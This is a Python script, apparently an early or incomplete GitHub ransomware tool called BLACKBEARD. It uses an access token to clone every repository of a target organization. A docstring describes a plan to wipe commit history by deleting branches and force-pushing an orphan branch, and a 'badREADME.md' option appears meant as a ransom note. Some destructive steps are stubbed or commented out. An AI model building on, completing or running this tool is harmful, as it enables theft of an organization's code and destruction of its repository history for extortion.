#!/usr/bin/env python3
import argparse
import logging
import os
import sys
import urllib3

CURRENT_DIRECTORY = os.path.dirname( os.path.abspath(__file__) )
SOURCE_DIRECTORY = os.path.join( CURRENT_DIRECTORY, 'src' )
sys.path.append( SOURCE_DIRECTORY )

# https://stackoverflow.com/questions/27981545/suppress-insecurerequestwarning-unverified-https-request-is-being-made-in-pythopyt
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logging.getLogger("requests").setLevel(logging.WARNING)
logging.getLogger("urllib3").setLevel(logging.WARNING)

NAME = 'BLACKBEARD'
logger = logging.getLogger( '{}'.format(NAME) )

from github import Github
import pygit2

class Volksfrei:
    """
    Self-Contained class for the ransomware actions for GitHub. 
    """
    def __init__( self, token,username=None ):
        self.g = Github(token)
        self.username = username
        self.credentials = pygit2.UserPass(self.username, token)

    def ransom(self, organization: str, delete_history=False):
        # get an object of all repos
        repos = self.g.get_organization(organization).get_repos()

        # loop
        for repo in repos:
            logger.info("cloning repo {}".format(repo.name))
            try:
                if os.path.exists("./{}".format(repo.name)):
                    logger.info("Skipping already seen repo {}.  Use -f to force rerun on all repos/branches".format(repo.name))
                else:
                    cloned_repo: pygit2.Repository = pygit2.clone_repository(repo.clone_url, "./{}".format(repo.name),
                                        callbacks=pygit2.RemoteCallbacks(credentials=self.credentials))

                if delete_history:
                    self.delete_commit_history(cloned_repo)

            except pygit2.GitError as e:
                logger.error(e)
                return False
        
        return True

    def delete_commit_history(self, repo: pygit2.Repository) -> bool:
        """
        Pattern:
        - delete non-Main branches
        - checkout new branch `git checkout --orphan orphan_branch
        - add files
        - commit
        - delete Main
        - rename orphan_branch working branch to main
        - force push
        """
        if not repo.is_empty:
            branches = repo.branches.remote
            for branch in branches:
                if branch == "origin/main" \
                        or branch == "origin/master" \
                        or branch == "origin/development"\
                        or branch == "origin/HEAD":
                    logger.info("Skipping branch {}".format(branch))
                    continue
                else:
                    logger.info("Deleting branch {}".format(branch))
                    #repo.branches.delete(branch)


def parse_arguments():
    parser = argparse.ArgumentParser()

    parser.add_argument('action', metavar='ACTION', type=str, help='Specify action for {}'.format(NAME) )

    parser.add_argument('-d', '--delete', help="Delete history", action='store_true')    

    parser.add_argument('-L', '--loglevel', help="Specify alternate logging level. (Default is NONE)")
    
    parser.add_argument('-t', '--token', help="Github token to use.", required=True)

    parser.add_argument('-U', '--username', help="Github username to use.", required=True)

    parser.add_argument('-o', '--organization', help="Github organization to attack", required=True)

    parser.add_argument('-R', '--readme', help="Filename of README to pass in.  Defaults to badREADME.md as README.md", default="./badREADME.md")

    parser.add_argument('-q', '--quiet', help="Enable quiet mode for logging.")
    
    return parser.parse_args()

if __name__ == "__main__":
    arguments = parse_arguments( )

    if not arguments.username:
        arguments.username = None

    logging.basicConfig(format='%(asctime)s %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p', level=arguments.loglevel)
    logger = logging.getLogger( NAME )

    if arguments.quiet:
        logger.propagate = False

    logger.info( '{} startup'.format(NAME) )

    if arguments.action.lower() == "ransom":
        v = Volksfrei( arguments.token )
        if arguments.delete:
            delete = True
        else:
            delete = False
        v.ransom( arguments.organization, delete_history=delete )
        logger.info("done")
